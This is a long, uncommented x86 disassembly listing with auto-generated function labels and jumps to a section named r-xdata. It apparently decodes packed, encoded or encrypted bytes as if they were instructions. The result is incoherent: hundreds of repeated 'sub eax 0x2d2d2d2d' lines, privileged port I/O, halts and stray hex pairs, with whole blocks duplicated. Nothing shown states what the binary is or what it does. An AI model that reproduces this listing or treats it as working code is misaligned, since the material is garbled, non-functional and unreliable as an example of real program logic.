inc edx
inc edx
sti
push esp
das
inc ecx
inc edx
inc edx
sub eax 0xdde834db
out 0xd7 eax
fstp st3
xor al 0xe8
sub_48bbd9
or eax 0x712334ee
mov ebp 0xdc55bdbd
mov ch 0xbd
mov ebp 0x573c57d5
pop es
out dx al
xor al 0x3b
pop ebp
mov ebp 0xed55bdbd
mov ch 0xbd
mov ebp 0x34ad793e
cmp ebx [ ecx - 0x43 ]
mov ebp 0x4e6654bd
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x54eb2d2d
and ah [ edx + 0x2d2dbdbd ]
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xc5d7e52d
jne r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x36c5d7e5
xor al 0xf0
cdq
in al 0x54
pop ebx
pop ecx
inc edx
inc edx
in al 0x54
mov ecx 0x2d424261
sub eax 0x362d2d2d
inc ebp
inc edx
sub dl [ 0x38bdbdbd ]
jge r-xdata
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
cmp [ eax ] ebp
mov ebp 0xd83ebdbd
inc ecx
mov ebp 0xbda75a54
mov ebp 0xbdbf9102
mov ebp 0x693830ea
inc eax
inc edx
inc edx
out dx al
in eax dx
push ebp
aad 0xbc
mov ebp 0xb1793ebd
out dx al
xlat
mov edi 0x36b1eb42
inc esi
inc edx
mov dl 0x38
test [ eax + 0x7d8ebdbd ] edi
push esp
jmp r-xdata
jne r-xdata
sub eax 0xd7e52d2d
lds esi [ esi ]
sub_48bdcc
jmp r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x112b422d
mov ebp 0xf830bdbd
stc
in eax dx
jpo r-xdata
xor al 0xc0
dec ebx
inc ebp
shl [ ecx + 0x38e4bdbd ] cl
jge r-xdata
rol [ ebp + 0x54 ] 0x16
dec ebx
inc edx
inc edx
xor eax 0xf83579f8
push 0x4b
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x7e39b22d
movsd [ edi ] [ esi ]
mov ebp 0xbf7b3ebd
push esp
or al 0xa5
mov ebp 0x2d2d2dbd
push ecx
sub esi 0xeaeb7d8e
xor al 0xf8
inc ebp
xor al 0xf8
dec ecx
push esp
loope r-xdata
jns r-xdata
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xfd2d2d2d
cmp [ esp + edx * 2 - 0x17 ] esi
jae r-xdata
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
inc ebx
sub eax 0x2d2d2d2d
sub eax 0x7439fd2d
push esp
imul esi [ eax ] 0xf83055f0
adc eax 0xf655f87a
jmp r-xdata
clc
push esp
cmpsd [ esi ] [ edi ]
push 0x42
inc edx
sub eax 0x473e2d2d
xchg esi eax
push esp
xchg [ ebx + 0x2d2dbdbd ] esi
sub eax 0x2d7ef52d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xe22d2d2d
jecxz r-xdata
inc edx
sub eax 0xbdd52d2d
lodsd [ esi ]
mov ebp 0x4ebe54bd
inc edx
inc edx
sub eax 0x342d2d2d
sub [ ebp - 0x424242c3 ] esi
cmp eax [ ss : ecx ]
mov ebp 0x7dd4bdbd
cmp [ ebp + 0x3bbebdbd ] edi
jge r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xe3e22d2d
out 0x74 al
jle r-xdata
je r-xdata
jmp 0x2d8b0141
push esp
sub [ ebp + 0x42 ] 0x2d2d2d42
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x547439fd
mov ebp 0x453030bd
inc eax
inc edx
inc edx
push ebp
inc ebp
jno r-xdata
sub eax 0x54ac372d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
cmp [ ebp - 0x4e ] bh
cmp [ edx + 0x54424259 ] esi
retn 0xbd9f
mov eax 0x2d424277
sub eax 0x2d2d2d2d
sub eax 0xa869552d
mov ebp 0xa9d054bd
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xd52d2d2d
sub eax 0xac372d2d
push esp
hlt
sub_48beff
push ebx
inc edx
inc edx
inc edx
cmp eax [ ecx ]
mov ebp 0x3830bdbd
imul eax [ eax + 0x42 ] 0x6aa75442
inc edx
inc edx
sub eax 0x473e2d2d
xchg esi eax
push esp
xchg [ ebx + 0x2d2dbdbd ] esi
sub eax 0x2d7ef52d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xe22d2d2d
jecxz r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xe3e22d2d
out 0x74 al
jle r-xdata
je r-xdata
inc ebp
jno r-xdata
sub eax 0x54ac372d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
cmp [ ebp - 0x4e ] bh
cmp [ edx + 0x54424259 ] esi
retn 0xbd9f
mov eax 0x2d424277
sub eax 0x2d2d2d2d
sub eax 0xa869552d
mov ebp 0xa9d054bd
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xd52d2d2d
sub eax 0xac372d2d
push esp
mov ebp 0x453030bd
inc eax
inc edx
inc edx
push ebp
hlt
sub_48c040
push ebp
dec esp
dec eax
inc edx
inc edx
cmp [ ebp - 0x4e ] bh
cmp [ edx - 0x11424243 ] bh
inc edx
sub edx [ ecx ]
mov ebp 0xe134bdbd
cdq
test eax 0xbdb8ca55
mov ebp 0x38fa428e
jge r-xdata
sub eax 0x2d2d2d2d
xor al 0xf8
inc ebp
inc edx
0x42b054e9 0x4242
cdq
insb
inc edx
inc edx
sub eax 0x382d2d2d
jge r-xdata
push esp
mov al 0x42
inc edx
inc edx
sub eax 0x34db2d2d
shl [ edx + 0x2d2dbdbd ] 0x2d
0x1993930 0xbdbf
sub_48c0cd
sbb ebx ebx
xor al 0xf8
adc esi [ esi ]
jae r-xdata
mov ebp 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xf8302d2d
clc
jno r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xb353552d
mov ebp 0x7d38e4bd
mov dl 0x38
int 0x75
inc edx
inc edx
push esp
sar [ ebp + 0x2d2dbdbd ] 0x2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x38302d2d
imul eax [ eax + 0x42 ] 0x34eeed42
add [ ecx + 0x40 ] ch
inc edx
inc edx
inc edx
jmp r-xdata
cmp eax 0x2d42424a
sub eax 0x2d2d2d2d
sub eax 0x9539b22d
push ecx
inc edx
inc edx
0x4254f754 0x2d42
sub eax 0x2d2d2d2d
sub eax 0x342d2d2d
clc
inc ebp
inc edx
0x42b054e9 0x4242
dec ecx
in eax dx
clc
mov ch 0xd7
mov ebp 0xbd9dfc54
mov ebp 0xb739b22d
mov ebp 0x428ebdbd
out dx al
xor al 0xc8
adc [ ecx + edx * 8 + 0x5c ] edx
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xa4d039b2
mov ebp 0x8f0ab2bd
fstp [ eax ]
dec ebx
push esp
adc al 0xab
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x302d2d2d
clc
sub eax 0x87a9372d
lea ebp [ ebp + 0x38b2f3fd ]
inc edx
inc edx
r-xdata
jle r-xdata
cli
inc edx
sub edx [ ecx ]
mov ebp 0x7a36bdbd
loop r-xdata
cld
popfd
mov ebp 0x39b22dbd
mov bh 0xbd
mov ebp 0xee428ebd
push eax
insb
inc edx
inc edx
loop r-xdata
push esp
stosd [ edi ]
insb
inc edx
inc edx
sub eax 0x372d2d2d
test eax 0xfdad8d87
mov dl 0x38
sub eax 0x6938302d
inc eax
inc edx
inc edx
in eax dx
out dx al
xor al 0x0
imul eax [ eax + 0x42 ] 0xadeb4242
push esp
in al dx
imul eax [ edx + 0x42 ] 0x2d2d2d2d
sub eax 0xbdaba455
mov ebp 0x4536e4e4
push esp
push esp
outsd
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
r-xdata
mov ebp 0x2d2dbdbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x302d2d2d
cmp [ ecx + 0x40 ] ch
cmp [ gs : edx + 0x54 ] al
dec esi
jb r-xdata
in eax dx
push ebp
xor [ esi + 0x42 ] eax
inc edx
xlat
lodsd [ esi ]
xor al bh
dec ebp
out dx al
in eax dx
push ebp
cmp eax 0x54424246
dec ebp
imul eax [ edx + 0x42 ] 0x2d2d2d2d
inc edx
sub eax 0x5449e830
inc ebx
pop esp
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xa9793e2d
push esp
jns r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
call 0x518713c0
mov cl 0xee
push esp
dec edi
inc edx
inc edx
in al 0xd7
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xbdbcb9d5
mov ebp 0x401d3830
inc edx
inc edx
in eax dx
out dx al
inc edx
0xb27d38f1 0x6d39
sub_48c167
sub eax 0xb11e542d
mov ebp 0xdb2d2dbd
xchg [ ds : ebp - 0x45afc64e ] edi
mov ebp 0xba6954bd
mov ebp 0x83552dbd
insb
cld
popfd
mov ebp 0x39b22dbd
mov bh 0xbd
mov ebp 0xee428ebd
cli
inc edx
sub edx [ ecx ]
mov ebp 0x7a36bdbd
loop r-xdata
push esp
stosd [ edi ]
insb
inc edx
inc edx
sub eax 0x372d2d2d
test eax 0xfdad8d87
mov dl 0x38
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xb353552d
mov ebp 0x7d38e4bd
mov dl 0x38
int 0x75
inc edx
inc edx
push esp
sar [ ebp + 0x2d2dbdbd ] 0x2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x38302d2d
imul eax [ eax + 0x42 ] 0x34eeed42
add [ ecx + 0x40 ] ch
inc edx
inc edx
inc edx
jmp r-xdata
cmp eax 0x2d42424a
sub eax 0x2d2d2d2d
sub eax 0x9539b22d
push ecx
inc edx
inc edx
0x4254f754 0x2d42
inc edx
inc edx
r-xdata
jle r-xdata
push eax
insb
inc edx
inc edx
loop r-xdata
sub eax 0x87a9372d
lea ebp [ ebp + 0x38b2f3fd ]
sub eax 0x6938302d
inc eax
inc edx
inc edx
in eax dx
out dx al
xor al 0x0
imul eax [ eax + 0x42 ] 0xadeb4242
push esp
in al dx
imul eax [ edx + 0x42 ] 0x2d2d2d2d
sub eax 0xbdaba455
mov ebp 0x4536e4e4
push esp
push esp
outsd
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
r-xdata
mov ebp 0x2d2dbdbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x302d2d2d
cmp [ ecx + 0x40 ] ch
cmp [ gs : edx + 0x54 ] al
dec esi
jb r-xdata
in eax dx
push ebp
xor [ esi + 0x42 ] eax
inc edx
xlat
lodsd [ esi ]
xor al bh
dec ebp
out dx al
in eax dx
push ebp
cmp eax 0x54424246
dec ebp
imul eax [ edx + 0x42 ] 0x2d2d2d2d
inc edx
sub eax 0x5449e830
inc ebx
pop esp
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xa9793e2d
push esp
jns r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
call 0x518713c0
mov cl 0xee
push esp
dec edi
inc edx
inc edx
in al 0xd7
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xbdbcb9d5
mov ebp 0x401d3830
inc edx
inc edx
in eax dx
out dx al
inc edx
0xb27d38f1 0x6d39
sub_48c301
mov esp 0x70d5bdbd
jno r-xdata
push ebp
enter 0x4251 0x42
push esp
test eax 0x2d42427a
sub eax 0x2d2d2d2d
xor ch ah
mov edi 0xd6b87dd6
mov ax 0x5e54
insd
inc edx
inc edx
sub eax 0xbcec552d
jpo r-xdata
aad 0xa9
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
inc edx
jmp r-xdata
mov ebp 0x5672d5bd
test [ ebx - 0x16 ] edx
xor al 0xfb
xor al 0x3b
xor [ ebp - 0x3aab4243 ] edi
outsd
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x9dd72d2d
loope r-xdata
sti
sub_48c336
xor al 0xf8
dec edi
in eax 0xd7
aam 0xdb
xor al 0xf8
dec ecx
push esp
or eax 0x2d42426b
sub eax 0xf830ed2d
xor eax 0xd7eeeeed
mov ecx 0x54eeeeee
sti
loope r-xdata
aad 0xa9
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
inc edx
jmp r-xdata
sub_48c38b
xor al 0xf8
inc edi
in eax 0xdb
xor al 0xf8
inc ecx
push esp
ja r-xdata
inc edx
sub edx [ ecx - 0x43 ]
mov ebp 0x793830bd
inc ecx
inc edx
inc edx
in eax dx
push ebp
js r-xdata
inc edx
sub eax 0x2d2d2d2d
mov dl 0x39
xchg esp eax
outsd
inc edx
inc edx
xlat
mov ebp 0xd4a04cd5
std
inc edx
or edi [ ecx - 0x43 ]
mov ebp 0x554336bd
jmp r-xdata
push esp
sub eax 0x2d42426d
call 0xffffffffed351582
inc edx
inc edx
std
in eax dx
xor [ eax ] bh
jns r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xeb422d2d
test [ esi ] esi
inc esi
inc edx
push esp
dec eax
mov eax [ 0xffffffffdb2dbdbd ]
xor al 0xf8
inc ebp
in eax 0xd7
xchg ebx eax
0x2dbdbdab 0x2d2d
sub eax 0x40753830
inc edx
inc edx
in eax dx
inc edx
inc edx
in eax dx
push esp
cmp [ ebp + 0x42 ] dl
inc edx
sub eax 0x5136e82d
push ecx
mov cl 0x30
clc
dec ecx
in eax dx
clc
mov ch 0x7a
clc
dec ecx
into
fstp st4
fdivr [ edx - 0x8 ]
inc ebp
sub_48c3b5
mov ebp 0xb1793ebd
sbb ch 0x57
mov ebp 0xba3ab2bd
outsd
inc edx
inc edx
inc edx
into
std
push esp
inc ecx
insb
inc edx
inc edx
in eax dx
xor al bh
push ecx
in eax dx
xor [ eax ] bh
jns r-xdata
clc
inc ecx
inc edx
inc edx
in eax dx
inc edx
sub edx [ ecx - 0x43 ]
mov ebp 0x793830bd
inc ecx
inc edx
inc edx
in eax dx
push ebp
js r-xdata
push esp
sub eax 0x2d42426d
call 0xffffffffed351582
inc edx
inc edx
std
in eax dx
xor [ eax ] bh
jns r-xdata
0x2dbdbdab 0x2d2d
sub eax 0x40753830
inc edx
inc edx
in eax dx
inc edx
inc edx
in eax dx
push esp
cmp [ ebp + 0x42 ] dl
inc edx
sub eax 0x5136e82d
push ecx
mov cl 0x30
clc
dec ecx
in eax dx
clc
mov ch 0x7a
clc
dec ecx
into
fstp st4
fdivr [ edx - 0x8 ]
inc ebp
sub_48c485
and [ eax + 0x42 ] bl
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xd92d2d2d
sbb al 0x7d
mov ebp 0xfd54bdbd
push ebp
inc edx
inc edx
sub eax 0xbf8d513c
mov ebp 0x54ebeebd
sub eax 0x2dbdbdb6
xor al 0xe8
inc ebp
clc
inc ecx
xor al 0xf8
pop ecx
clc
inc ebp
push esp
pushad
ja r-xdata
sub eax 0x2d2d2d2d
xor al bh
push ecx
in eax dx
0x5551e034 0x598c
inc edx
sub eax 0x2d2d2d2d
sub eax 0x193d362d
mov ebp 0x7d3ebdbd
mov ch 0xed
push esp
sub [ edx + 0x42 ] bh
inc edx
sub eax 0xd7542d2d
inc edi
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x4272ca55
inc edx
in al 0xe4
je r-xdata
xor [ eax ] bh
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
xor al 0xf8
insd
xor al bh
insd
push esp
out dx al
mov ebp 0x39b2bdbd
and esp [ ebx + 0x42 ]
inc edx
push esp
pop es
outsd
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x61c842ed
inc edx
enter 0xea51 0x55
adc [ eax + 0x42 ] bl
inc edx
r-xdata
push esp
fidivr [ ebp + edi * 4 - 0x785d243 ]
mov ebp 0x2339b2bd
arpl [ edx + 0x42 ] ax
je r-xdata
jpe r-xdata
cmp [ ebp + 0x54 ] bh
push ebp
arpl [ edx + 0x42 ] ax
sub eax 0xbd790b42
mov ebp 0x554336bd
stc
lodsb [ esi ]
mov ebp 0xb1793ebd
push esp
arpl [ edi + 0x42 ] sp
inc edx
sub eax 0x36e82d2d
push ecx
push ecx
in eax 0xee
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x42ee2d2d
sub edi [ 0x34bdbdbd ]
stc
cdq
lodsd [ esi ]
xchg [ esi - 0x4e ] bh
cmp bh bl
pop edi
inc edx
inc edx
out dx al
push esp
jmp r-xdata
push ebp
inc ecx
inc edx
inc edx
in eax dx
xor [ eax ] bh
push ecx
inc eax
inc edx
inc edx
in eax dx
dec edx
push ebp
adc ah [ edx + 0x42 ]
inc edx
r-xdata
sub eax 0x2d2d2d2d
xor al 0xf8
inc ebp
clc
inc ecx
xchg al bh
inc ebp
push esp
dec edx
inc edx
inc edx
sub eax 0x38302d2d
inc ecx
mov esp 0x36bdbdbd
clc
inc ecx
jecxz r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x47e034db
xlat
fidiv [ esi ]
sub_48c4a6
mov ebp 0x4255fd54
inc edx
sub eax 0xbf8d513c
mov ebp 0x54ebeebd
sub eax 0x2dbdbdb6
xor al 0xe8
inc ebp
clc
inc ecx
xor al 0xf8
pop ecx
clc
inc ebp
push esp
pushad
ja r-xdata
sub eax 0x2d2d2d2d
xor al bh
push ecx
in eax dx
0x5551e034 0x598c
inc edx
sub eax 0x2d2d2d2d
sub eax 0x193d362d
mov ebp 0x7d3ebdbd
mov ch 0xed
push esp
sub [ edx + 0x42 ] bh
inc edx
sub eax 0xd7542d2d
inc edi
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x4272ca55
inc edx
in al 0xe4
je r-xdata
xor [ eax ] bh
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
xor al 0xf8
insd
xor al bh
insd
push esp
out dx al
mov ebp 0x39b2bdbd
and esp [ ebx + 0x42 ]
inc edx
push esp
pop es
outsd
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x61c842ed
inc edx
enter 0xea51 0x55
adc [ eax + 0x42 ] bl
inc edx
r-xdata
push esp
fidivr [ ebp + edi * 4 - 0x785d243 ]
mov ebp 0x2339b2bd
arpl [ edx + 0x42 ] ax
je r-xdata
jpe r-xdata
cmp [ ebp + 0x54 ] bh
push ebp
arpl [ edx + 0x42 ] ax
sub eax 0xbd790b42
mov ebp 0x554336bd
stc
lodsb [ esi ]
mov ebp 0xb1793ebd
push esp
arpl [ edi + 0x42 ] sp
inc edx
sub eax 0x36e82d2d
push ecx
push ecx
in eax 0xee
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x42ee2d2d
sub edi [ 0x34bdbdbd ]
stc
cdq
lodsd [ esi ]
xchg [ esi - 0x4e ] bh
cmp bh bl
pop edi
inc edx
inc edx
out dx al
push esp
jmp r-xdata
push ebp
inc ecx
inc edx
inc edx
in eax dx
xor [ eax ] bh
push ecx
inc eax
inc edx
inc edx
in eax dx
dec edx
push ebp
adc ah [ edx + 0x42 ]
inc edx
r-xdata
sub eax 0x2d2d2d2d
xor al 0xf8
inc ebp
clc
inc ecx
xchg al bh
inc ebp
push esp
dec edx
inc edx
inc edx
sub eax 0x38302d2d
inc ecx
mov esp 0x36bdbdbd
clc
inc ecx
jecxz r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x47e034db
xlat
fidiv [ esi ]
sub_48c5e5
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
out dx al
inc edx
sub edi [ 0x34bdbdbd ]
stc
cdq
lodsd [ esi ]
xchg [ esi - 0x4e ] bh
cmp bh bl
pop edi
inc edx
inc edx
out dx al
push esp
jmp r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x47e034db
xlat
fidiv [ esi ]
sub_48c685
xor al 0xe0
inc ecx
push esp
0x2d424278 0x2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xe52d2d2d
xlat
fcom [ ebx + edi + 0x6b ]
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
jne r-xdata
mov ecx 0xbd8dbdd5
mov ebp 0x4276bd54
inc edx
sub eax 0xdb98d7e5
xor al 0xf8
push ecx
in eax 0xd7
aam 0xdb
xor al 0xf8
push ebx
in eax 0x54
cmpsd [ esi ] [ edi ]
inc ecx
inc edx
inc edx
sub eax 0x39b27d38
push ebx
inc edx
inc edx
rcr [ ecx + 0x39b2bd99 ] 0x70
push ebx
inc edx
inc edx
retn 0xbdb5
cmp [ 0x55424240 ] bh
or eax 0x3042425b
clc
pop ecx
push esp
leave
inc ecx
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xf0362d2d
inc ecx
inc edx
int3
sub_48c72a
mov dl 0x39
mov edx 0x36bdbdbd
jne r-xdata
mov ebp 0x3055c030
xor [ 0x55424240 ] cl
bound eax [ bp + si + 0x42 ]
cmp [ ebp - 0x4e ] bh
cmp dh bh
lodsd [ esi ]
mov ebp 0xad9554bd
mov ebp 0x2d2d2dbd
sub eax 0x547d38e4
aaa
inc esp
inc edx
inc edx
0x55a1fb34 0x4133
mov ch 0x7d
inc edx
inc edx
inc edx
leave
cdq
movsd [ edi ] [ esi ]
push esp
out dx al
push edx
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x112b422d
mov ebp 0x3030bdbd
inc ebp
inc eax
inc edx
inc edx
push ebp
pop edx
add al [ edx + 0x42 ]
push esp
jmp r-xdata
aam 0xdb
xor al 0xf8
push ebx
in eax 0x54
cmpsd [ esi ] [ edi ]
inc ecx
inc edx
inc edx
sub eax 0x39b27d38
push ebx
inc edx
inc edx
rcr [ ecx + 0x39b2bd99 ] 0x70
push ebx
inc edx
inc edx
retn 0xbdb5
sub_48c77a
add [ ecx + 0x42 ] ebp
inc edx
sub eax 0x7d382d2d
mov dl 0x38
in al 0xad
mov ebp 0x55c030bd
xor [ eax ] dh
or eax 0x55424240
bound eax [ bp + si + 0x42 ]
cmp [ ebp - 0x4e ] bh
cmp dh bh
lodsd [ esi ]
mov ebp 0xad9554bd
mov ebp 0x2d2d2dbd
sub eax 0x547d38e4
aaa
inc esp
inc edx
inc edx
0x55a1fb34 0x4133
sub_48c810
lodsd [ esi ]
mov ebp 0x649154bd
inc edx
inc edx
sub eax 0x54d9d72d
shl [ edi + 0x42 ] cl
inc edx
sub eax 0x2d2d2d2d
sub eax 0x30b9d72d
sti
mov ebp ebp
clc
inc ebp
push esp
and [ ecx + 0x42 ] al
inc edx
sub eax 0xedee2d2d
push ebp
adc [ eax + 0x42 ] cl
inc edx
clc
mov ch 0x36
int 0x81
mov esi 0xfb0ab24d
test eax 0x54b1793e
pop eax
mov ecx 0x2d2dbdbd
sub eax 0x4df834db
xlat
iretd
sub_48c8b9
lea ecx [ eax + 0x42 ]
inc edx
r-xdata
push ebp
cdq
jpe r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
inc edx
xchg [ edx - 0x4e ] bh
cmp edx esp
lodsd [ esi ]
mov ebp 0x99d93ebd
xchg ecx eax
mov ebp 0x99f97beb
test eax 0xa89b55bc
mov ebp 0x34ebe4bd
stc
cdq
mov [ ebp + 0x66 ] edx
mov ebx 0xd93ebdbd
cdq
cdq
mov ebp 0x99f934e4
mov [ ecx + eax * 8 + 0x39b28d99 ] eax
inc edx
inc edx
push ebp
mov al 0x40
inc edx
jmp r-xdata
inc edx
inc edx
inc edx
push esp
into
popad
inc edx
inc edx
jpo r-xdata
inc edx
mov ebp 0x425dc655
inc edx
in eax dx
xor al bh
inc edx
in eax dx
xor [ eax ] bh
imul eax [ eax + 0x42 ] 0x4255ed42
inc dx
inc edx
r-xdata
sub eax 0xb2bf7d3e
or cl [ ebp - 0x244083c2 ]
cmp [ ebx - 0x4e ] cl
cmp dh dh
jge r-xdata
loopne r-xdata
mov dl 0x39
push esp
push edx
inc esi
inc edx
inc edx
sub eax 0x2d2d2d2d
r-xdata
sub eax 0x2d2d2d2d
xor al 0xf9
cdq
lodsd [ esi ]
xchg [ esi - 0x4e ] bh
cmp [ edx - 0x11424243 ] bh
inc edx
sub edx [ ecx ]
mov ebp 0x54eabdbd
shr [ edx + 0x2d2dbdbd ] 0x1
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
mov dl 0x38
daa
jl r-xdata
inc edx
sub eax 0x2d2d2d2d
sub eax 0x5939b22d
jpo r-xdata
mov dl 0xa
lea edi [ esi ]
jl r-xdata
out dx al
xlat
mov ecx 0x688754ee
inc edx
inc edx
sub eax 0x38b27438
out 0xb6 eax
mov ebp 0x42f054bd
inc edx
inc edx
sub eax 0xb22d2d2d
sub [ ebp + 0x74 ] bh
jle r-xdata
inc edx
sub eax 0x7b5939b2
inc edx
fstp [ eax ]
dec ebx
mov dl 0x38
idiv [ ebp + 0x42 ]
sub eax 0x34db2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x5444362d
loope r-xdata
push ecx
mov cl 0xd7
mov ch 0x30
clc
dec ecx
xlat
mov ebp 0x4ea255ed
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xdb2d2d2d
xor al 0xf0
jg r-xdata
jl r-xdata
inc edx
inc edx
push esp
adc [ eax + 0x42 ] 0x42
sub eax 0x42015a55
inc edx
push esp
push ecx
mov bl 0xbd
mov ebp 0xb4d538b2
mov ebp 0x55f830bd
in eax dx
jmp r-xdata
dec esi
int3
mov dl 0xbd
mov ebp 0x15754e4
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x732438b2
inc edx
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xd52d2d2d
mov ecx 0x30bdbdbc
cmp cl al
inc eax
inc edx
inc edx
push esp
add eax 0x2d42426b
sub eax 0x2d2d2d2d
sub eax 0xdfd72d2d
sub_48c988
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xbd153b34
mov ebp 0x471455bd
inc edx
inc edx
r-xdata
push esp
test [ ecx + 0x2d2dbdbd ] esi
sub eax 0xf9342d2d
cdq
lodsd [ esi ]
xchg [ esi - 0x4e ] bh
cmp [ edx - 0x11424243 ] bh
inc edx
sub edx [ ecx ]
mov ebp 0x54eabdbd
shr [ edx + 0x2d2dbdbd ] 0x1
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
